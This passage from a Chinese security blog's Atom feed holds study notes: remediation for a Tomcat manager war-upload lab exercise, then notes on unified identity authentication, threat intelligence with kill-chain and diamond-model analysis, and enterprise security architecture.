拥有text接口权限</li></ul></li></ul><p>3、正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><p>4、为什么需要上传war包，为什么不是tar.zip一类的。</p><p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p><p>2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p><p>3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h1&gt;&lt;p&gt;Tomcat是Jakarta项目开发的&lt;strong&gt;Servlet&lt;/strong&gt;容器，实现了&lt;strong&gt;对Serv
      
    
    </summary>
    
    
    
      <category term="vulfocus练习" scheme="http://yoursite.com/tags/vulfocus%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>统一身份认证与应用</title>
    <link href="http://yoursite.com/2020/08/10/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2020/08/10/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%BA%94%E7%94%A8/</id>
    <published>2020-08-10T14:12:22.000Z</published>
    <updated>2020-08-10T14:23:17.215Z</updated>
    
    <content type="html"><![CDATA[<p>1、统一身份认证(IAM, Identity and Access Management)与单点登录(SSO, single sign on)是同一个概念。如果没有统一身份认证，那么你进入任何一个应用系统都要求输入账号和密码，这样一方面难以记住众多的账号和密码，另一方面使用云端资源很烦琐。</p><p>2、对于云端应用系统的访问控制，通常分为三个层面：</p><p>认证：解决能否进入的问题。</p><p>授权：解决进入后能做什么的问题。</p><p>记账：解决做了事情后就要承担相应责任的问题，可能还要付费。</p><p>这就是通常所说的 3A 安全机制（Authentication，Authorization，Accountability）。</p><p>3、基于 3A 安全机制的访问控制在现代操作系统中被普遍采用，例如 Linux 操作系统访问控制步骤如下：</p><p>1）用户输入账号和密码企图登录系统，此时操作系统会进行认证（Authentication），即核对输入的账号和密码与保存在系统里的账号和密码是否相符。如果相符，则允许登录。</p><p>2）登录后的用户并不能为所欲为，其每一步操作都必须被授权（Authorization），比如允许进入什么目录、哪些文件允许读、哪些文件允许写、哪些文件允许删除等，都处于操作系统严密的监视之下。</p><p>3）用户的全部操作都被作为日志记录下来（Accountability），方便以后落实责任、事后监督，并作为付费的依据。</p><p>4、Windows 操作系统也采用相同的方法，作为云端的统一身份认证系统，必须实现以下四个功能：</p><p>1）统一用户管理（Identification）</p><p>租户的账号、密码等信息集中存储，统一管理。</p><p>2）身份鉴别（Authentication）</p><p>当租户企图登录某个应用系统时，验证他的票据或者身份是否合法。</p><p>3）权限控制（Authorization）</p><p>规定允许登录系统的租户具备哪些操作权限。</p><p>4）操作日志登记（Accountability）</p><p>记录租户的操作行为，以便事后责任追溯。</p><p>5、统一身份认证的功能描述</p><p>5.1、用户管理</p><img src="/2020/08/10/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%BA%94%E7%94%A8/1.png" class title="This is an image"><p>企业的安全治理：</p><ul><li>根据用户职责规划用户组</li><li>并根据职责为用户组授权</li><li>再将用户加入到用户组中</li><li>使得用户具有所属用户组中的权限</li></ul><p>优势：</p><ul><li>用户灵活管理</li><li>当用户职责发生变化时，只需要调整其所属用户组即可</li><li>权限精细管理</li><li>您可以基于项目授予用户某个资源的操作权限</li></ul><p>5.2、联邦身份认证</p><img src="/2020/08/10/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%BA%94%E7%94%A8/2.png" class title="This is an image"><p>单点登录：</p><p>企业内员工需要访问云时，无需注册云账号，通过配置联邦身份认证，在自身企业管理系统中认证后，即可直接访问云。</p><p>优势：</p><ul><li>入口统一</li><li>企业用户仅需要在自身的企业管理系统登录</li><li>轻松管理</li><li>企业只需管理一套企业管理系统的用户信息</li></ul><p>5.3、权限共享</p><img src="/2020/08/10/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%BA%94%E7%94%A8/3.png" class title="This is an image"><p>协作：</p><p>您需要与其他账号共享你的资源和权限，但无需提供密码或密钥。</p><p>优势：</p><ul><li>使用便捷</li><li>选择好需要共享的权限后创建委托给被委托账号</li><li>可随时回收</li><li>建立的委托关系可以随时根据您的需要取消</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、统一身份认证(IAM, Identity and Access Management)与单点登录(SSO, single sign on)是同一个概念。如果没有统一身份认证，那么你进入任何一个应用系统都要求输入账号和密码，这样一方面难以记住众多的账号和密码，另一方面使用
      
    
    </summary>
    
    
    
      <category term="统一身份认证" scheme="http://yoursite.com/tags/%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>威胁情报与分析模型</title>
    <link href="http://yoursite.com/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://yoursite.com/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</id>
    <published>2020-08-05T14:06:54.000Z</published>
    <updated>2020-08-05T14:31:32.748Z</updated>
    
    <content type="html"><![CDATA[<p>整理自K0rz3n的博客，在此做记录【状态：通读一遍】</p><p><a href="https://www.k0rz3n.com/2019/03/19/威胁情报概念与APT事件分析模型概述/" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/19/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%A6%82%E5%BF%B5%E4%B8%8EAPT%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/</a></p><h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><p>1、威胁情报是关于IT或信息资产所面临的现有或潜在的威胁的循证知识，包括情境、机制、指标、推论与可行建议，这些知识可为威胁响应提供决策依据。</p><p>2、威胁情报的按不同标准有很多不同的分类方式，根据数据本身威胁情报可分为HASH值，IP地址，域名，网络或主机特征，TTPs这几种。</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/1.png" class title="This is an image"><p>【左侧为可利用情报，右侧为这些情报给攻击者造成的困难程度】</p><p>2.1、一般来说情报中价值最低的是Hash值、IP地址和域名（也就是常说的信誉库），其次是网络/主机特征、攻击工具特征，对攻击者影响最大的是TTPs（战术、技术和行为模式）类型的威胁情报。这里分别做个简单介绍：</p><p><strong>HASH值</strong>：一般指<u>样本、文件的HASH值</u>，比如MD5和SHA系列。由于HASH函数的雪崩效应，文件任何微弱地改变，都会导致产生一个完全不同也不相关的哈希值。这使得在很多情况下，它变得不值得跟踪，所以它带来的防御效果也是最低的。</p><p><strong>IP地址</strong>：常见的指标之一，通过<u>IP的访问控制</u>可以抵御很多常见的攻击，但是又因为IP数量太大，任何攻击者均可以尝试更改IP地址，以绕过访问控制。</p><p><strong>域名</strong>：有些攻击类型或攻击手法也或者出于隐藏的目的，攻击者会<u>通过域名连接外部服务器进行间接通信</u>，由于域名需要购买、注册、与服务器绑定等操作使得它的成本相对IP是比较高的，<u>对域名的把控</u>产生的防御效果也是较好的。但是对于<u>高级APT攻击或大规模的团伙攻击，往往会准备大量备用域名</u>，所以它的限制作用也是有限。</p><p><strong>网络或主机特征</strong>：这里指的特征可以是很多方面，比如<u>攻击者浏览器的User-Agent、登录的用户名、访问的频率</u>等，这些特征就是一种对<u>攻击者的描述，这些情报数据可以很好的将攻击流量从其他的流量中提取出来</u>，就会产生一种较好的防御效果。</p><p><strong>攻击工具</strong>：这里是指<u>获取或检测到了攻击者使用的工具</u>，这种<u>基于工具的情报数据能够使得一批攻击失效，攻击者不得不进行免杀或重写工具</u>，这就达到了增加攻击成本的目的。</p><p><strong>TTPs</strong>：Tactics、Techniques &amp; Procedures的缩写，这里是指<u>攻击者所使用的攻击策略、手法等，掌握了些信息就能明白攻击者所利用的具体漏洞</u><u>，就能够针对性的布防</u>，使得攻击者不得不寻找新的漏洞，所以这也是价值最高的情报数据。</p><p>3、威胁情报按传统分类方法分为以下三类</p><p><strong>战术级情报</strong>：战术情报的作用主要是<u>发现威胁事件以及对报警确认或优先级排序</u>。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。</p><p><strong>运营级情报</strong>：运营级情报是<u>给安全分析师或者说安全事件响应人员使用</u>的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。</p><p><strong>战略级情报</strong>：战略层面的威胁情报是<u>给组织的安全管理者使用</u>的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。</p><h1 id="APT-事件的分析与防御"><a href="#APT-事件的分析与防御" class="headerlink" title="APT 事件的分析与防御"></a>APT 事件的分析与防御</h1><p>高级持续性威胁(Advanced Persistent Threat)</p><p>1、威胁情报在事件分析中的定位</p><p>1.1、威胁情报数据并不能帮助甲方来预测攻击，威胁情报在安全运营体系中的定位是——<u>辅助发现潜在的或正在发起的恶意行为或操作</u>，重点在于辅助两个字，威胁情报严格意义上来说只能有限地感知潜在的威胁，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。</p><p>1.2、威胁情报既然是个辅助手段，那么肯定有一个主要手段，这个主要的手段其实就是<u>针对事件的分析</u>，接下来主要说的是<u>两个分析使用的模型——钻石模型和Kill-Chain模型(杀伤链模型)</u>，这两个模型在分析的时候往往需要结合起来使用，尤其是比较大型的针对性的攻击诸如APT攻击。</p><p>2、杀伤链模型【攻击的进程和路线】</p><p>Kill-Chain模型分为7个部分，侦查阶段（Reconnaissance）、武器化阶段（Weaponization）、部署阶段（Delivery）、攻击阶段（Exploitation）、后门植入阶段（Installation）、远程控制阶段（C&amp;C, Command&amp;Control）、后渗透阶段（Actives on Objects），也就是下面这个样子：</p><p><strong>侦查阶段</strong>：<u>扫描目标IT资产和信息收集</u>，比如说Google Hacking这些侦查类型的攻击</p><p><strong>武器化阶段</strong>：将前一阶段发现和扫描到<u>漏洞的信息整合到一起并制作针对性的武器</u>（当然国内的嘛，你懂得）</p><p><strong>部署阶段</strong>：将这些<u>武器或者是远控RAT部署到对应的Compromised Servers</u>上</p><p><strong>攻击阶段</strong>：<u>使用这些Compromised Servers和之前做好的武器化工具对目标发起攻击</u></p><p><strong>后门种植阶段</strong>：<u>安装远程控制的服务和进程</u></p><p><strong>远控阶段</strong>：让<u>目标和C&amp;C通信</u></p><p><strong>后渗透阶段</strong>：收割、继续<u>横向渗透入侵</u></p><p>一次完整的攻击行为的参考就是上面说到的Kill-Chain，也就是用来<u>描述的攻击者攻击的路线和进行的进度</u>。但是Kill-Chain只能说明攻击的进程和路线，并不能很好地说明其造成的影响和目的，钻石模型就很好的针对性的补充了这点。</p><p>3、钻石模型【造成的影响和目的】</p><p>3.1、钻石模型是一个针对单个事件分析的模型，核心就是用来<u>描述攻击者的技战术和目的</u>，具体的钻石模型如下图所示：</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/2.png" class title="This is an image"><p>【攻击者因为什么原因，利用哪些基础设施，并通过哪些手段，攻击了怎样的一个目标】</p><p>具体一点的关于图中信息的解释如下：</p><p><strong>社会政治影响</strong>：处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。<u>攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因</u>，纵切面表示的就是社会政治影响。说大白话就是<u>根据这俩人去发现攻击的意图</u>。</p><p><strong>技战术组合</strong>：技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为<u>基础设施和技术能力</u>，这里的基础设施和技术能力其实都是相对于攻击者而言的。</p><p><strong>元数据</strong>：这个其实就是左边列出来的，<u>攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用</u></p><p><strong>置信度</strong>：也就是以上你分析出<u>结果的可信程度</u>。</p><p>3.2、钻石模型建立的基本元素是入侵活动事件，事件有四个基本特征：对手、能力、基础设施和受害者。</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/3.png" class title="This is an image"><p><strong>对手</strong>：对手的知识一般情况下难以掌握，特别是在刚发现的时候，这时候会简单的将对手的活动当作对手。</p><p><strong>能力</strong>：描述事件中使用的<u>工具或者技术</u>。可以包括最原始的手工方法，也可以是高度复杂的自动化攻击，所有已披露的漏洞应该属于其一部分。</p><p><strong>基础设施</strong>：描述攻击者用来递送能力的物理或逻辑结构，如：IP地址、域名、邮件地址、或者某个USB设备等。基础设施有两种类型，一类是<u>攻击者完全控制及拥有</u>的，另一类是<u>短时间控制</u>的，如僵尸主机、恶意网址、攻击跳跃点、失陷的账号等等，它们很可能会混淆恶意活动的起源和归属。</p><p><strong>受害者</strong>：受害者的身份和资产在不同的分析中都非常有用，受害者或社会-政治为支点的安全分析中受害者身份作用重大，而脆弱性评估必然和资产相关。资产同时可能是攻击面或最终目标。</p><p>3.3、支点分析pivote</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/4.png" class title="This is an image"><p>4、杀伤链与钻石模型的组合分析</p><p>复杂的攻击往往都是由一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/5.png" class title="This is an image"><p>其实这张图描述的是这么一个事件：</p><p>1.攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息</p><p>2.攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息</p><p>3.攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件</p><p>4.目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪</p><p>5.网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response</p><p>6.我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效</p><p>7.通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务</p><p>8.通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标</p><p>9.攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式</p><p>10.攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的</p><p>11.此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器</p><p>12.使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞</p><p>13.被攻陷的目标三号主机返回一个shell会话给攻击者三号</p><p>14.目标三号的所有数据被攻击者三号窃取</p><p>这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。</p><p>5、基于Kill-Chain的安全防护矩阵</p><img src="/2020/08/05/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/6.png" class title="This is an image"><h1 id="ATT-amp-CK框架"><a href="#ATT-amp-CK框架" class="headerlink" title="ATT&amp;CK框架"></a>ATT&amp;CK框架</h1><p>补充ing</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;整理自K0rz3n的博客，在此做记录【状态：通读一遍】&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.k0rz3n.com/2019/03/19/威胁情报概念与APT事件分析模型概述/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https:/
      
    
    </summary>
    
    
    
      <category term="威胁情报" scheme="http://yoursite.com/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>大型互联网企业安全架构</title>
    <link href="http://yoursite.com/2020/05/20/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/"/>
    <id>http://yoursite.com/2020/05/20/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/</id>
    <published>2020-05-20T13:26:12.000Z</published>
    <updated>2020-09-11T14:57:24.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础运维"><a href="#基础运维" class="headerlink" title="基础运维"></a>基础运维</h1><p>业务开发（Dev）完成后，就进入运维（Ops）阶段了，该阶段的资产管理、漏洞与补丁管理、安全配置基线、应急响应等如果没有做好也容易造成各种安全风险。</p><h1 id="基础安全运营平台"><a href="#基础安全运营平台" class="headerlink" title="基础安全运营平台"></a>基础安全运营平台</h1><p>基础安全运营平台是集<strong>威胁情报、漏洞检测、入侵感知、主动防御、后门查杀、安全基线、安全大脑</strong>于一体的综合安全平台，承担着企业抵御各种网络攻击和防范内部风险的重任。首先通过威胁情报从外部获取最新的攻击数据和趋势，其次通过漏洞检测统计企业资产并周期性巡检、修补安全漏洞，再基于入侵感知发现各种网络、主机、服务的攻击，随后使用主动防御、后门查杀及安全基线实现对入侵攻击免疫和安全加固，最后通过安全大脑统筹分析和自动化响应，一气呵成完成互联网企业的基础安全运营工作。</p><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>随着网络安全环境越来越复杂，威胁情报（TIP）也扮演着越来越重要的角色。除了传统的URL、IP地址、域名（Domain）、文件（File），漏洞的POC（Proof Of Concept）、攻击手法、社交媒体信息、通过GPS（全球定位系统）获取的信息、数据泄露情况等也属于广义的安全威胁情报。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>在运营阶段，常常会爆发很多新型漏洞或第三方组件漏洞，这些漏洞在开发阶段通常可能没有被发现或公开，或者在做运维配置时使用了弱口令等，这为导致安全问题埋下了隐患，所以周期性的漏洞巡检必不可少。</p><p>按照漏洞检测方式的不同，漏洞大致可以被分为以下3种类型。·</p><p>网络漏洞：可以通过对端口直接进行远程扫描而发现的漏洞，如OpenSSH远程溢出漏洞、MySQL弱口令等。·</p><p>主机漏洞：只能在本地利用和检测的漏洞，如Linux内核提权、glibc漏洞提权等。·</p><p>网站漏洞：需要通过爬虫和遍历网站页面提取URL和参数才能检测的漏洞，如SQL注入、XSS跨站、命令执行、SSRF等。</p><h2 id="入侵感知"><a href="#入侵感知" class="headerlink" title="入侵感知"></a>入侵感知</h2><p>入侵感知技术是一种通过监控一系列与安全相关的异常指标来达到发现入侵目的的手段。一般可以从被动渠道感知入侵：①网络异常，如DDoS攻击、异常DNS请求、ARP欺骗；②主机异常，如暴力破解、反弹shell、系统提权；③隔离异常，如VM逃逸、容器逃逸；④应用异常，如命令执行、文件读写、SQL注入。也可从主动渠道（如蜜罐、诱饵、蜜签）来感知入侵。</p><h2 id="主动防御"><a href="#主动防御" class="headerlink" title="主动防御"></a>主动防御</h2><p>主动防御技术通常以保护为主。在系统默认安全的基础上加入主动防御技术通常有助于拦截已知或未知的安全威胁，比如，对于主机层Linux内核提权漏洞，在内核层再加上一层内核保护技术即可拦截提权进程；在应用层的Struts2、Spring框架基础上加入RASP技术即可拦截绝大部分零日漏洞。通过主动防御来层层设防，如使用HIPS、WAF、RASP、数据库防火墙等，即可实现纵深防御架构，从而保障业务的安全性。</p><blockquote><p>纵深防御：将安全性应用于多个层，其工作原理是为每个层提供不同类型的保护，以便为提供阻止攻击的最佳手段。这些层也可以防止不同的问题，全方位覆盖多个不同问题。</p><p>纵深防御的目标是确保每层都知道如何在可疑的攻击事件中采取行动，限制恶意或意外破坏的机会，并最大限度地提高快速识别任何安全漏洞的机会。比如：</p><p>1.让员工先进行筛选；</p><p>2.最低权限的设定，仅允许对某人执行其指定角色所需的系统和资源的最低级别访问权限。例如，门卫没有理由访问闭路电视系统，或者保安人员有一个允许他们重新配置网络的计算机帐户。</p><p>3.职责分离，这样做是为了确保不将敏感流程或特权分配给单个人，这样做有助于通过实现检查和平衡来防止欺诈和错误。一个很好的例子是在医院，在给药之前，需要由另一个人检查数量和类型，以防止出现用药错误。</p><p>4.实施权限撤销政策，例如立即撤销任何IT或物理访问权限，以快速对危机做出反应。</p></blockquote><h2 id="后门查杀（AV）"><a href="#后门查杀（AV）" class="headerlink" title="后门查杀（AV）"></a>后门查杀（AV）</h2><p>黑客入侵服务器后为了长期控制或便于操作系统通常会在主机中留下后门。一般后门大致分为3类：①高度隐蔽性后门Rootkit，②一般性远程控制后门，③在Web环境下执行的Webshell后门。</p><h2 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h2><p>安全基线</p><p>配置安全问题在安全漏洞中占很大比例，涉及的范围包括网络、操作系统、各种应用服务器以及数据库系统等。常见的安全基线包含默认安全配置和安全加固两部分。</p><p>【安全配置基线基本包括了所有的操作系统、数据库、中间件、网络设备、浏览器、云服务的安全配置，一般互联网公司可基于上述安全基线模板来开发自己的安全基线检查系统。】</p><h2 id="安全大脑"><a href="#安全大脑" class="headerlink" title="安全大脑"></a>安全大脑</h2><p>安全大脑</p><p>安全大脑即安全数据的综合分析与编排自动化响应中心，主要功能包含安全态势感知（SecuritySituation Awareness，SSA）、安全信息和事件管理（Security Information and EventManagement，SIEM）、安全编排与自动化响应（Security Orchestration,Automation andResponse，SOAR）。</p><h1 id="阿里云1-3安全运营管控理念"><a href="#阿里云1-3安全运营管控理念" class="headerlink" title="阿里云1+3安全运营管控理念"></a>阿里云1+3安全运营管控理念</h1><p>“安全融入设计、自动化监控与响应、红蓝对抗与持续改进”</p><h2 id="安全的自动化监控与响应"><a href="#安全的自动化监控与响应" class="headerlink" title="安全的自动化监控与响应"></a>安全的自动化监控与响应</h2><p>无法纯靠人力去处理上万台服务器的监控日志，必须通过大数据处理平台辅以AI等技术将绝大部分安全威胁固化成可以自动化响应的流程，比如SOAR（安全编排与自动化响应）相关技术。</p><blockquote><p>安全编排与自动化 (SOA， Security Orchestration and Automation)</p><p>安全编排是指将客户不同的系统或者一个系统内部不同组件的安全能力通过可编程接口 (API) 和人工检查点，按照一定的逻辑关系组合到一起，用以完成某个特定安全操作的过程。譬如用户针对一封收到的可疑邮件进行深入检测与响应（操作）的过程可以分解为根据拆解出来的发件人、URL 链接和 IP 等信息查询威胁情报系统，将附件送入沙箱系统进行分析，并根据情报系统和沙箱系统返回的信息进一步决定是否要通知邮件系统删除该邮件或者附件，是否要通过 EDR 获取收件人终端上的进一步信息做分析，等等。上述这个可疑邮件分析的过程就是一个将邮件系统、威胁情报系统、沙箱系统、EDR 等等系统通过一定的逻辑编排到一起的实例。</p><p>安全自动化在这里特指自动化的编排过程，也就是一种特殊的编排。如果编排的过程完全都是依赖各个相关系统的 API 实现的，那么它就是可以自动化执行的。与自动化编排对应的，还有人工编排和部分自动化（混合）编排。</p><p>安全事件响应平台 (SIRP, Security Incident Response Platform) </p><p>安全事件响应平台在 SOAR 出现之前就一直存在，顾名思义就是一个针对 Incident 进行响应和处置的平台。但 SOAR 出现后，安全事件响应与安全编排与自动化的结合使得响应的能力获得了极大的提升。通常，安全事件响应包括告警管理、工单管理、案件 (Case) 管理等功能。</p><p>告警管理的核心不仅是对告警安全事件的收集、展示和响应，更强调告警分诊和告警调查。只有通过告警分诊和告警调查才能提升告警的质量，减少告警的数量。</p><p>工单管理适用于中大型的安全运维团队协同化、流程化地进行告警处置与响应，并且确保响应过程可记录、可度量、可考核。</p><p>案件管理是现代安全事件响应管理的核心能力。案件管理帮助用户对一组相关的告警进行流程化、持续化的调查分析与响应处置，并不断积累该案件相关的痕迹物证 (IOC) 和攻击者的战技过程指标信息 (TTP)。多个案件并行执行，从而持续化地对一系列安全事件进行追踪处置。</p><p>威胁情报平台 (TIP, Threat Intelligence Platform) </p><p>威胁情报平台通多对多源威胁情报的收集、关联、分类、共享和集成，以及与其它系统的整合，协助用户实现攻击的阻断、检测和响应。威胁情报主要是以服务而非平台的形式存在。目前 TIP 市场规模不大，厂商不多，有的是独立存在，有的依附于威胁情报服务，还有的跟安全响应结合，融合到 SOAR 里面。</p></blockquote><h3 id="建立自动化监控与响应系统"><a href="#建立自动化监控与响应系统" class="headerlink" title="建立自动化监控与响应系统"></a>建立自动化监控与响应系统</h3><p>通过安全技术来实现可以收集和分析安全威胁并自动进行防护响应的平台，通过建立纵深防御安全感知能力来收集数据，通过建立基于大数据和AI的分析决策能力来处理数据并动态响应。</p><p>在提升安全工程能力的同时，需要建立快速的监控发现响应能力，尽量将安全威胁限制在可控范围内，并能够在受到安全威胁时快速恢复，即韧性安全架构。</p><h2 id="红蓝对抗与持续改进"><a href="#红蓝对抗与持续改进" class="headerlink" title="红蓝对抗与持续改进"></a>红蓝对抗与持续改进</h2><p>安全技术随着互联网技术的演进而演进。早期的Web漏洞基本上都是CGI（公共网关接口）相关的漏洞，后来Java兴起后又出现了Struts2等漏洞，现在云计算出现我们又面对虚拟机逃逸、Docker容器安全、微服务架构安全等新方向的漏洞。</p><p>面对不断出现的安全问题，我们需要通过红蓝对抗来持续提升防护水平、改进防护技术、建立安全评估方法，让安全防御系统成为持续迭代更新的良性循环系统。</p><h3 id="持续进行攻防对抗与安全创新"><a href="#持续进行攻防对抗与安全创新" class="headerlink" title="持续进行攻防对抗与安全创新"></a>持续进行攻防对抗与安全创新</h3><p>建立自己的红蓝团队，通过相互对抗来不断提升自己的防护水平，在这个过程中通过持续创新来解决业界普遍面临的安全难题，改变安全防护技术滞后于安全攻击技术的现状。</p><h1 id="国际著名安全架构理论"><a href="#国际著名安全架构理论" class="headerlink" title="国际著名安全架构理论"></a>国际著名安全架构理论</h1><h2 id="P2DR模型"><a href="#P2DR模型" class="headerlink" title="P2DR模型"></a>P2DR模型</h2><p>以PDR模型为基础，它是动态安全理论的主要模型，可表示为安全=风险分析+执行策略+系统实施+漏洞监测+实时响应。</p><p>动态安全理论的最基本原理是：信息安全相关的所有活动，不管是攻击行为、防护行为、检测行为，还是响应行为等，都要消耗时间。因此可以用时间来衡量一个体系的安全性和安全能力，即提高系统的防护时间（PT），降低检测时间（DT）和响应时间（RT）。</p><p>P2DR模型包括四个主要部分：Policy（安全策略），Protection（防护）、Detection（检测）和Response（响应）。</p><p>P2DR模型是在动态安全理论的控制和指导下，在综合运用防护工具（如防火墙、操作系统身份认证、加密等）的同时，利用检测工具（如漏洞评估、入侵检测等）了解和评估系统的安全状态，通过适当的响应将系统调整到“最安全”和“风险最低”的状态。防护、检测和响应组成了一个完整的、动态的安全循环，在动态安全理论的指导下可以有效地保证信息系统的安全。</p><h2 id="网络韧性架构"><a href="#网络韧性架构" class="headerlink" title="网络韧性架构"></a>网络韧性架构</h2><p>CR架构，该架构基本上将信息安全、业务连续性和企业人员组织弹性结合在一起。网络韧性架构的目标是使整个网络始终保持提供预期结果的能力，意味着即使在常规运行机制失败时，在遭遇安全灾难或受到攻击之后，整个网络依旧可以正常运行。技术点如下：</p><p>自适应响应：通过敏捷的网络行动方案来管理风险。自适应响应包括动态更改配置（动态改变路由、IPS、防火墙、网关等参数规则）；动态分配资源（负载均衡、熔断机制、调整服务、通信优先级）；自适应管理（根据运营、环境威胁的变化来动态调整授权和访问权限，自动关闭系统，以及对资源进行动态部署和替换）。</p><p>监控分析：持续和协调地监控和分析各种属性和行为。监控分析包括：进行监测和损失评估（漏洞扫描、通过IDS检测、恶意软件检测、开源信息监控）；进行综合数据分析（对安全意识、安全审计、日志收集等进行分析）；进行取证分析（分析员工行为、通过安全逆向技术进行取证分析）等。</p><p>协调保护：确保保护机制以协调有效的方式运作。协调保护包括：纵深防御，如设计纵深防御化系统，结合网络、主机、应用层的入侵检测，以及三权分立与多因素认证功能实现对敏感和重点资产的强化保护；一致性分析，确定是否以及如何以协调一致的方式进行防护，最大限度地减少干扰、潜在的级联故障并减小覆盖差距；安全编排，使用剧本（Playbook）协调各安全组件；红蓝对抗，通过红蓝对抗来检测防护的有效性并持续改进防护措施。</p><p>欺骗防御：误导攻击者，隐藏关键资产或将隐蔽的受污染资产暴露给对手。进行欺骗防御可以使用如下几个手段：混淆手段，如数据加密、传输加密、特征匿名、Hash加密；虚假信息，如诱饵；误导手段，如蜜罐网络；污染手段，如部